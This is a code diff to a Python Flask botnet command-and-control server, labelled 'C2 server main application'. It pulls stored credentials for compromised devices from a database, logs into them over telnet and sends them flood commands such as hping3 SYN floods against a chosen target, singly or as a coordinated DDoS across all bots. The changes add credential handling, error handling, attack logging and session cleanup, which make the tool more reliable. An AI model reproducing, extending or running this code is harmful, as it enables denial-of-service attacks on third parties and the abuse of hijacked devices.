@@ -1,3 +1,4 @@
+# C2 server main application
 from flask import Flask, request, jsonify
 import logging
 import threading
@@ -5,17 +6,19 @@ import time
 from datetime import datetime
 import os
 
-from database import DatabaseManager
-from telnet_manager import TelnetManager
-from web_interface import render_dashboard, handle_bot_checkin
+# Import our modules
+from .db_manager import DatabaseManager
+from .tn_manager import TelnetManager
+from .web_ui import render_dashboard, handle_bot_checkin
 
 # Configure logging
+log_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'c2_server.log')
 logging.basicConfig(
     level=logging.INFO,
     format='%(asctime)s - %(levelname)s - %(message)s',
     handlers=[
         logging.StreamHandler(),
-        logging.FileHandler('c2_server.log')
+        logging.FileHandler(log_file)
     ]
 )
 
@@ -31,7 +34,8 @@ attack_lock = threading.Lock()
 
 def get_active_sessions():
     """Get count of active telnet sessions"""
-    return len(telnet_manager.active_sessions)
+    with attack_lock:
+        return len(active_attacks)
 
 @app.route('/')
 def index():
@@ -65,6 +69,15 @@ def start_attack():
         device = db_manager.get_device(bot_ip)
         if not device:
             return jsonify({'error': 'Device not found'}), 404
+            
+        # Extract credentials from device record
+        try:
+            username = device['username']
+            password = device['password']
+            if not username or not password:
+                return jsonify({'error': 'Device has invalid credentials'}), 400
+        except (KeyError, TypeError) as e:
+            return jsonify({'error': f'Invalid device data structure: {str(e)}'}), 500
 
         # Prepare attack command based on type
         if attack_type == 'syn':
@@ -76,7 +89,7 @@ def start_attack():
 
         # Execute attack via telnet
         session = telnet_manager.execute_telnet_login_and_send(
-            bot_ip, device['username'], device['password'], cmd
+            bot_ip, username, password, cmd
         )
 
         if session:
@@ -109,7 +122,12 @@ def stop_attack():
         with attack_lock:
             if bot_ip in active_attacks:
                 session = active_attacks[bot_ip]['session']
-                telnet_manager.close_session(session)
+                try:
+                    # Close the telnet session
+                    session.close()
+                except Exception as e:
+                    logging.error(f"Error closing telnet session for {bot_ip}: {e}")
+                
                 del active_attacks[bot_ip]
                 logging.info(f"Stopped attack from {bot_ip}")
                 return jsonify({'message': 'Attack stopped'})
@@ -142,6 +160,15 @@ def start_telnet_ddos():
         success_count = 0
         for device in devices:
             try:
+                # Extract credentials
+                if not device or 'ip' not in device or 'username' not in device or 'password' not in device:
+                    logging.warning(f"Invalid device data structure: {device}")
+                    continue
+                    
+                device_ip = device['ip']
+                username = device['username']
+                password = device['password']
+                
                 # Prepare attack command
                 if attack_type == 'syn':
                     cmd = f"hping3 -S -p 80 -c 1000 {target}"
@@ -152,22 +179,29 @@ def start_telnet_ddos():
 
                 # Execute attack
                 session = telnet_manager.execute_telnet_login_and_send(
-                    device['ip'], device['username'], device['password'], cmd
+                    device_ip, username, password, cmd
                 )
 
                 if session:
                     with attack_lock:
-                        active_attacks[device['ip']] = {
+                        active_attacks[device_ip] = {
                             'target': target,
                             'type': attack_type,
                             'start_time': datetime.now(),
                             'session': session
                         }
                     success_count += 1
+                    logging.info(f"Started {attack_type} attack from {device_ip}")
 
             except Exception as e:
-                logging.error(f"Error starting attack on {device['ip']}: {e}")
+                logging.error(f"Error starting attack on {device.get('ip', 'unknown')}: {e}")
                 continue
+
+        # Log attack to database for historical tracking
+        try:
+            db_manager.log_attack(attack_type, target, success_count)
+        except Exception as e:
+            logging.error(f"Failed to log attack to database: {e}")
 
         if success_count > 0:
             msg = f"Started {attack_type} attack on {success_count} devices against {target}"
@@ -189,10 +223,11 @@ def stop_telnet_ddos():
                 return jsonify({'message': 'No active attacks'})
 
             # Close all sessions
-            for bot_ip, attack_info in active_attacks.items():
+            for bot_ip, attack_info in list(active_attacks.items()):
                 try:
                     session = attack_info['session']
-                    telnet_manager.close_session(session)
+                    if session:
+                        session.close()
                 except Exception as e:
                     logging.error(f"Error closing session for {bot_ip}: {e}")
 
@@ -213,23 +248,34 @@ def cleanup_inactive_sessions():
                 current_time = datetime.now()
                 to_remove = []
 
-                for bot_ip, attack_info in active_attacks.items():
+                for bot_ip, attack_info in list(active_attacks.items()):
+                    # Check if the session exists and is valid
+                    if 'session' not in attack_info or not attack_info['session']:
+                        to_remove.append(bot_ip)
+                        continue
+
                     # Remove sessions older than 1 hour
                     if (current_time - attack_info['start_time']).total_seconds() > 3600:
                         try:
                             session = attack_info['session']
-                            telnet_manager.close_session(session)
+                            if session:
+                                session.close()
                             to_remove.append(bot_ip)
+                            logging.info(f"Cleaned up expired attack session for {bot_ip}")
                         except Exception as e:
                             logging.error(f"Error cleaning up session for {bot_ip}: {e}")
+                            # Still mark for removal even if close fails
+                            to_remove.append(bot_ip)
 
+                # Remove all marked sessions
                 for bot_ip in to_remove:
                     del active_attacks[bot_ip]
 
         except Exception as e:
             logging.error(f"Error in cleanup thread: {e}")
 
-        time.sleep(300)  # Check every 5 minutes
+        # Sleep for 5 minutes before next cleanup
+        time.sleep(300)
 
 if __name__ == '__main__':
     # Start cleanup thread
@@ -237,4 +283,4 @@ if __name__ == '__main__':
     cleanup_thread.start()
 
     # Start Flask server
-    app.run(host='0.0.0.0', port=5000, debug=False) 
+    app.run(host='0.0.0.0', port=5000, debug=False)
